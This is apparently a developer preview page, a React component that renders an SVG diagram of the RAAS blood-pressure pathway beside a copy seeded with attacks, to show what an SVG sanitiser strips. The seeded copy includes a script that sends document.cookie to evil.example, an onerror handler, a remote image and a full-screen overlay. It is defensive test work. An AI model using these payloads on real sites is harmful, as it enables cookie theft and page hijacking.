"use client";

// DEV-ONLY PREVIEW — a mechanism figure, drawn in the house style, beside what the sanitiser does
// to a hostile one.
//
// The left column is the RAAS pathway Wondering drew (docs/canvas-workspace-reference.md §10),
// re-drawn to OUR house style: `currentColor` ink so it suits both themes, no background rect, the
// four fills that each mean something. The right column is the same drawing with every attack the
// sanitiser is written against buried in it, so the two can be compared by eye.

import { SvgFigureBlock } from "@/components/workspace/svg-figure";
import { sanitizeSvgFigure } from "@/lib/workspace/svg-figure";

const HOUSE = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600">
  <title>How ACE inhibitors and ARBs block the RAAS pathway that raises blood pressure</title>
  <defs>
    <marker id="arrow" markerWidth="12" markerHeight="10" refX="10" refY="5" orient="auto"><polygon points="0,0 12,5 0,10" fill="currentColor"/></marker>
    <marker id="block" markerWidth="12" markerHeight="10" refX="10" refY="5" orient="auto"><polygon points="0,0 12,5 0,10" fill="#879A39"/></marker>
  </defs>
  <text x="400" y="52" text-anchor="middle" font-size="32" font-weight="bold" fill="currentColor">RAAS Pathway</text>
  <rect x="310" y="90" width="180" height="60" rx="8" fill="#7BCAFF" stroke="currentColor" stroke-width="3"/>
  <text x="400" y="128" text-anchor="middle" font-size="28" font-weight="bold" fill="currentColor">RAAS</text>
  <line x1="350" y1="150" x2="245" y2="215" stroke="currentColor" stroke-width="3" marker-end="url(#arrow)"/>
  <line x1="450" y1="150" x2="555" y2="215" stroke="currentColor" stroke-width="3" marker-end="url(#arrow)"/>
  <rect x="110" y="225" width="240" height="70" rx="8" fill="#5ABDAC" stroke="currentColor" stroke-width="3"/>
  <text x="230" y="255" text-anchor="middle" font-size="26" fill="currentColor">Constricts</text>
  <text x="230" y="283" text-anchor="middle" font-size="26" fill="currentColor">vessels</text>
  <rect x="450" y="225" width="240" height="70" rx="8" fill="#5ABDAC" stroke="currentColor" stroke-width="3"/>
  <text x="570" y="255" text-anchor="middle" font-size="26" fill="currentColor">Retains</text>
  <text x="570" y="283" text-anchor="middle" font-size="26" fill="currentColor">salt + water</text>
  <line x1="230" y1="295" x2="345" y2="390" stroke="currentColor" stroke-width="3" marker-end="url(#arrow)"/>
  <line x1="570" y1="295" x2="455" y2="390" stroke="currentColor" stroke-width="3" marker-end="url(#arrow)"/>
  <rect x="270" y="400" width="260" height="70" rx="8" fill="#DFB431" stroke="currentColor" stroke-width="3"/>
  <text x="400" y="443" text-anchor="middle" font-size="26" fill="currentColor">High blood pressure</text>
  <rect x="60" y="500" width="240" height="60" rx="8" fill="#879A39" stroke="currentColor" stroke-width="3"/>
  <text x="180" y="538" text-anchor="middle" font-size="26" fill="currentColor">ACE inhibitors</text>
  <rect x="500" y="500" width="200" height="60" rx="8" fill="#879A39" stroke="currentColor" stroke-width="3"/>
  <text x="600" y="538" text-anchor="middle" font-size="26" fill="currentColor">ARBs</text>
  <line x1="200" y1="500" x2="255" y2="330" stroke="#879A39" stroke-width="4" marker-end="url(#block)"/>
  <line x1="590" y1="500" x2="545" y2="330" stroke="#879A39" stroke-width="4" marker-end="url(#block)"/>
  <text x="150" y="420" text-anchor="middle" font-size="26" fill="#879A39">block</text>
  <text x="660" y="420" text-anchor="middle" font-size="26" fill="#879A39">block</text>
</svg>`;

const HOSTILE = HOUSE.replace(
  "<title>",
  `<script>fetch("https://evil.example?c="+document.cookie)</script>` +
    `<foreignObject width="800" height="600"><img src=x onerror="alert(1)"></foreignObject>` +
    `<image href="https://evil.example/pixel.png" width="800" height="600"/>` +
    `<title>`,
).replace('<rect x="310" y="90"', '<rect onclick="alert(1)" style="position:fixed;inset:0" class="z-50" x="310" y="90"');

export default function SvgFigurePreview() {
  const house = sanitizeSvgFigure(HOUSE);
  const hostile = sanitizeSvgFigure(HOSTILE);
  return (
    <main className="min-h-screen p-10" data-workspace="">
      <p className="mb-6 max-w-2xl text-sm text-(--ui-text-secondary)">
        A mechanism figure in the house style, and the same drawing with a script, a foreignObject, a
        remote image, an event handler, an inline style and a class buried in it. Both are rendered
        through the same sanitiser, so what you see on the right is what survives.
      </p>
      <div className="grid max-w-[1100px] grid-cols-2 gap-8">
        <div>
          <p className="mb-2 text-xs font-medium text-(--ui-text-tertiary)">House style</p>
          {house ? <SvgFigureBlock figure={house} /> : <p className="text-sm text-(--board-error-text)">Refused.</p>}
        </div>
        <div>
          <p className="mb-2 text-xs font-medium text-(--ui-text-tertiary)">Same drawing, six attacks buried in it</p>
          {hostile ? <SvgFigureBlock figure={hostile} /> : <p className="text-sm text-(--board-error-text)">Refused.</p>}
          <pre className="mt-3 max-h-[200px] overflow-auto rounded-lg bg-(--ui-bg-secondary) p-3 text-[10px] leading-[14px]" data-hostile-output="">
            {hostile?.svg.slice(0, 900)}
          </pre>
        </div>
      </div>
    </main>
  );
}
